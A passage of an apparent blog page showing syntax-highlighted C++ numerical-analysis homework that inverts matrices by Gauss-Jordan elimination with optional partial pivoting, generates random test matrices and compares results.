class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\texit(0);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void fileFormat()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#########################################################\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">## 411 Homework: Numerical Analysis                    ##\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">## Brian Chen, Oct 20, 2012                            ##\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#########################################################\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"File format for a 3rd order matrix (input):\\n\");</span><br><span class=\"line\">\t\tprintf(\" - numbers below are space deliminated.  no tabs.\\n\");</span><br><span class=\"line\">\t\tprintf(\" - There are three lines, each with 3 numbers.\\n\");</span><br><span class=\"line\">\t\tprintf(\" - They will be parsed as doubles.\\n\");</span><br><span class=\"line\">\t\tprintf(\" - Comment lines start with <span class=\"comment\">#.  Comment lines cannot.\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"   interrupt the 3 lines with the matrix, but can come.\\n\");</span><br><span class=\"line\">\t\tprintf(\"   before or after.\\n\");</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"---- Matrix file below, not including this line ----\\n\");</span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\"># comment\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\"># comment\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"1.2 3.3 4.4\\n\");</span><br><span class=\"line\">\t\tprintf(\"1.112 2.24 0\\n\");</span><br><span class=\"line\">\t\tprintf(\"3.4 2.2 98.23452\\n\");</span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"---- Matrix file above, not including this line ----\\n\");</span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\tprintf(\"<span class=\"comment\">#########################################################\\n\");</span></span><br><span class=\"line\">\t\tprintf(\"\\n\");</span><br><span class=\"line\">\t\texit(0);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\">//</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">///</span><br><span class=\"line\"></span><br><span class=\"line\">//</span>Inside the result, the result <span class=\"keyword\">is</span> <span class=\"keyword\">to</span> be stored as:</span><br><span class=\"line\"><span class=\"regexp\">//i=0 i=1 i=2</span><br><span class=\"line\">//</span>[<span class=\"number\">0</span>] [<span class=\"number\">3</span>] [<span class=\"number\">6</span>]  <span class=\"regexp\">//j=0</span><br><span class=\"line\">//</span>[<span class=\"number\">1</span>] [<span class=\"number\">4</span>] [<span class=\"number\">7</span>]  <span class=\"regexp\">//j=1</span><br><span class=\"line\">//</span>[<span class=\"number\">2</span>] [<span class=\"number\">5</span>] [<span class=\"number\">8</span>]  <span class=\"regexp\">//j=2</span><br><span class=\"line\">//</span></span><br><span class=\"line\"><span class=\"regexp\">//where the above 3x3 matrix is as you would write it on paper.</span><br><span class=\"line\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is mainly used for debug. we can use it to output</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @param m: the matrix that needed to be output</span><br><span class=\"line\"> *        size: the size of matrix</span><br><span class=\"line\"> * @return NULL</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"literal\">void</span> output(double  ** m,int size)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(DEBUG == <span class=\"number\">0</span>) <span class=\"keyword\">return</span> ;<span class=\"regexp\">//Debug is defined in StdAfx.h </span><br><span class=\"line\">    for(int i = 0;i &lt; size;++ i)&#123;</span><br><span class=\"line\">        for(int j = 0;j &lt; size + size;++ j)&#123;</span><br><span class=\"line\">            if(j == size) printf(\"|\\t\");</span><br><span class=\"line\">            printf(\"%f\\t\",m[i][j]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        printf(\"\\n\");</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    printf(\"\\n\");</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * this function is mainly used to swap two lines in a matrix</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @param matrix: the matrix that needed to be swaped</span><br><span class=\"line\"> *        a: the first line which should be swaped</span><br><span class=\"line\"> *        b: the second line which should be swaped</span><br><span class=\"line\"> *        size: the size of the matrix</span><br><span class=\"line\"> * @return NULL</span><br><span class=\"line\"> **/</span><br><span class=\"line\"></span><br><span class=\"line\">void swap(double ** matrix,int a,int b,int size)&#123;</span><br><span class=\"line\">    output(matrix,size);</span><br><span class=\"line\">    double tmp[1000];</span><br><span class=\"line\">    memcpy(tmp,matrix[a],size * 2 * sizeof(double));</span><br><span class=\"line\">    memcpy(matrix[a],matrix[b], size * 2 * sizeof(double));</span><br><span class=\"line\">    memcpy(matrix[b],tmp,size * 2 * sizeof(double));</span><br><span class=\"line\">    output(matrix,size);</span><br><span class=\"line\">    return ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * this function is used to get the Max line of the matrix and swap it to the first line</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @param tmp: the matrix</span><br><span class=\"line\"> *        k: the col that we should find the max line</span><br><span class=\"line\"> *        size: the size of matrix</span><br><span class=\"line\"> * @return NULL</span><br><span class=\"line\"> **/</span><br><span class=\"line\">void getMax(double ** tmp, int k,int size)&#123;</span><br><span class=\"line\">    int Max = k;</span><br><span class=\"line\">    for(int i = k + 1;i &lt; size;++ i)&#123;</span><br><span class=\"line\">        if(fabs(tmp[i][k]) &gt; fabs(tmp[Max][k])) Max = i; //g</span>et the max line</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(Max != k) &#123;</span><br><span class=\"line\">        swap(tmp,Max,k,size);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to do the most important things, invert the matrix</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @param matrix: the matrix that needed to be inverted</span><br><span class=\"line\"> *        type: it is the simple one or pivot one</span><br><span class=\"line\"> *              1: pivot 2:simple</span><br><span class=\"line\"> *        size: the size of matrix;</span><br><span class=\"line\"> **/</span> </span><br><span class=\"line\">double ** runTmp(double ** matrix, bool type,int size)&#123;</span><br><span class=\"line\">\tint i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    double div;</span><br><span class=\"line\"></span><br><span class=\"line\">    double ** tmp = <span class=\"keyword\">new</span> double*[size];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; size;i ++)&#123;</span><br><span class=\"line\">        tmp[i] = <span class=\"keyword\">new</span> double[size + size];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i &lt; size;++ i)&#123;<span class=\"regexp\">//read matrix into tmp matrix and add i after matrix</span><br><span class=\"line\">        for(int j = 0;j &lt; size + size;++ j)&#123;</span><br><span class=\"line\">            if(j &lt; size) tmp[i][j] = matrix[i][j];</span><br><span class=\"line\">            else tmp[i][j] = (j - size == i);//i</span>f <span class=\"literal\">it</span> <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> the original matrix, add <span class=\"number\">1s</span> <span class=\"keyword\">and</span> <span class=\"number\">0s</span> <span class=\"keyword\">to</span> the i matrix</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int k = <span class=\"number\">0</span>;k &lt; size;++ k)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(type) getMax(tmp,k,size);<span class=\"regexp\">//if it is pivot one, just get the max line and swap it to the first line</span><br><span class=\"line\">        while(tmp[k][k] == 0 &amp;&amp; k &lt; size - 1) swap(tmp,k,k + 1,size), ++k;//</span><span class=\"keyword\">try</span> <span class=\"keyword\">to</span> get the <span class=\"literal\">no</span>-zero line </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!tmp[k][k])&#123;<span class=\"regexp\">// this maxtrix is not invertable</span><br><span class=\"line\">            printf(\"This Matrix can\\'t be inverted\\n\");</span><br><span class=\"line\">            exit(0);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        for(i = k + 1;i &lt; size;++ i)&#123;</span><br><span class=\"line\">            if((div = tmp[i][k] / tmp[k][k]) == 0) continue;</span><br><span class=\"line\">            for(int j = k;j &lt; size + size;++ j)&#123;</span><br><span class=\"line\">                tmp[i][j] -= div * tmp[k][j];//</span> solve <span class=\"keyword\">this</span> line</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int k = size - <span class=\"number\">1</span>;k &gt;= <span class=\"number\">0</span>;-- k)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i = k;i &gt;= <span class=\"number\">0</span>;-- i)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!tmp[k][k])&#123;</span><br><span class=\"line\">                printf(<span class=\"string\">\"This Matrix can\\'t be inverted\\n\"</span>);</span><br><span class=\"line\">                exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>((div = tmp[i][k] / tmp[k][k]) == <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(int j = size + size - <span class=\"number\">1</span>;j &gt;= <span class=\"number\">0</span>;-- j)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(i == k) tmp[i][j] /= tmp[k][k];</span><br><span class=\"line\">                <span class=\"keyword\">else</span> tmp[i][j] -= div * tmp[k][j]; </span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        output(tmp,size);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> tmp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to do simple inversion</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @param matrix: the matrix that needed to be inverted</span><br><span class=\"line\"> *        size: the size of matrix</span><br><span class=\"line\"> * @return the matrix that has been inverted</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\">double ** simpleMatrixInversion( double ** matrix ,int size)&#123;</span><br><span class=\"line\">    int i = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"regexp\">//insert your code here.//</span></span><br><span class=\"line\">    double ** tmp = runTmp(matrix, <span class=\"number\">0</span>,size);</span><br><span class=\"line\">    <span class=\"regexp\">//declare and allocate the result</span><br><span class=\"line\">    double ** result = new double*[size];</span><br><span class=\"line\">    for(i = 0; i&lt;size; i++)&#123;</span><br><span class=\"line\">        result[i] = new double[size];</span><br><span class=\"line\">        for(int j = 0;j &lt; size;++ j)&#123;</span><br><span class=\"line\">            result[i][j] = tmp[i][j + size];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\treturn result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * this function is used to do pivot inversion</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @param matrix: the matrix that needed to be inverted</span><br><span class=\"line\"> *        size: the size of matrix</span><br><span class=\"line\"> * @return the matrix that has been inverted</span><br><span class=\"line\"> **/</span><br><span class=\"line\"></span><br><span class=\"line\">double ** partialPivotInversion( double ** matrix,int size )&#123;</span><br><span class=\"line\">\tint i = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//i</span>nsert your code here.<span class=\"regexp\">//</span><br><span class=\"line\">    double ** tmp = runTmp(matrix,1,size);</span><br><span class=\"line\"></span><br><span class=\"line\">\t//</span>declare <span class=\"keyword\">and</span> allocate the result</span><br><span class=\"line\">    double ** result = <span class=\"keyword\">new</span> double*[size];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i&lt;size; i++)&#123;</span><br><span class=\"line\">        result[i] = <span class=\"keyword\">new</span> double[size];</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int j = <span class=\"number\">0</span>;j &lt; size;++ j)&#123;</span><br><span class=\"line\">            result[i][j] = tmp[i][j + size];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to plus one line to another line</span><br><span class=\"line\"> * this function is used in generate step</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @param m:the matrix that needed to be changed</span><br><span class=\"line\"> *        size: the size of maxtrix</span><br><span class=\"line\"> * @return NULL</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\"><span class=\"literal\">void</span> linePlus(double ** m, int size)&#123;</span><br><span class=\"line\">    double times = getRandDouble();</span><br><span class=\"line\">    int line1 = rand() % size, line2 = rand() % size;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i = <span class=\"number\">0</span>;i &lt; size;++ i)&#123;</span><br><span class=\"line\">        m[line1][i] += m[line2][i] * times;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to generate matrix</span><br><span class=\"line\"> * @param size: the size of matrix that needed to be generated</span><br><span class=\"line\"> * @return the generated matrix</span><br><span class=\"line\"> **/</span></span><br><span class=\"line\">double ** generateMatrix(int size)&#123;</span><br><span class=\"line\">    srand((unsigned)time(NULL));</span><br><span class=\"line\">    double ** m = <span class=\"keyword\">new</span> double *[size];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i = <span class=\"number\">0</span>;i &lt; size;++ i) m[i] = <span class=\"keyword\">new</span> double[size];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i = <span class=\"number\">0</span>;i &lt; size;++ i)&#123;</span><br><span class=\"line\">        m[i][i] = getRandDouble();<span class=\"regexp\">//get the initiate matrix, whose main line are random doubles and others are 0s.</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    int times = size * 8; //</span>we need <span class=\"keyword\">to</span> modify <span class=\"keyword\">this</span> matrix <span class=\"string\">\"times\"</span> times. we set times = size * <span class=\"number\">8</span></span><br><span class=\"line\">    printf(<span class=\"string\">\"Time = %d\\n\"</span>,times);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i = <span class=\"number\">0</span>;i &lt; times;++ i)&#123;</span><br><span class=\"line\">        linePlus(m, size);<span class=\"regexp\">//add a random line to another random line</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ofstream out(\"./debug/generate\");//</span>output the matrix <span class=\"keyword\">to</span> a file</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i = <span class=\"number\">0</span>;i &lt; size;++ i)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int j = <span class=\"number\">0</span>;j &lt; size;++ j)&#123;</span><br><span class=\"line\">            out &lt;&lt; m[i][j] &lt;&lt; <span class=\"string\">' '</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        out &lt;&lt; endl;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    printf(<span class=\"string\">\"Matrix has been stored to ./debug/generate\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> m;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * this function is used to compare two matrix</span><br><span class=\"line\"> * @param two matrix and their size</span><br><span class=\"line\"> * @return if they are same</span><br><span class=\"line\"> * tip: this eps is defined in StdAfx.h </span><br><span class=\"line\"> **/</span></span><br><span class=\"line\">bool compare(double ** m1, double ** m2,int size)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(int i = <span class=\"number\">0</span>;i &lt; size;++ i)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(int j = <span class=\"number\">0</span>;j &lt; size;++ j)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(fabs(m1[i][j] - m2[i][j]) &gt; eps) <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span>/</span><br><span class=\"line\"><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span class=\"regexp\">////</span><span 